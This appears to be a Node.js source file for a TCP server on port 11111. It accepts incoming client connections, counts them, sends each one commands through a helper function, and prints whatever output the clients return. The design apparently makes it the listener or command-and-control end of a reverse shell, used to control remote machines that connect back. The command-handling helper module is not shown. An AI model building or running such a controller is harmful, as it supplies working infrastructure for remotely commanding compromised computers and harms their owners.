"use strict";
const net = require("net");
const util = require("./utils.js");
const server = net.createServer((client) => {
    client.on("error", (error) => {
        switch (error.code) {
            case "ECONNRESET":
                console.log("\[-] Client disconnected!");
                util.getClientCount(server);
                break;
            default:
                break;
        }
    });
});

server.listen(11111,() => {
    console.log("Started server on", server.address());
});

server.on("connection", (client) => {
    util.getClientCount(server);
    console.log("[+] Connection receieved:", client.remoteAddress, client.address().port);
    util.takeAndSendCommand(client);

     client.on("data", (data) =>  {
        console.log("Data",data.toString());
        util.takeAndSendCommand(client);
    });
});

